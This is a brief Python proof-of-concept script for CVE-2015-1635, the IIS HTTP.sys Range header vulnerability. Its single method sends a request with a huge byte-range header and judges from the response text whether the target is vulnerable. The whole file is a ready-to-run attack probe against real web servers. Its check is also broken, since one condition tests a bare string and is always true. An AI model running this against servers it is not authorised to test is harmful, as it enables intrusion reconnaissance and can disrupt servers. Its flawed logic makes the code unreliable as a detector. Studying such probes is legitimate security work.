#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""PoC of CVE-2015-1635
"""

import requests


class Exploit(object):

    """Test CVE-2015-1635
    """

    def __init__(self):
        """init
        """
        super(Exploit, self).__init__()

    def poc(self, url):
        headers = {"Range": "bytes=0-18446744073709551615"}
        r = requests.get(url, headers=headers)
        if "Requested Range Not Satisfiable" in r.content:
            return True
        elif "The request has an invalid header name":
            return False
        return None


if __name__ == '__main__':
    e = Exploit()
    e.poc("http://localhost/")
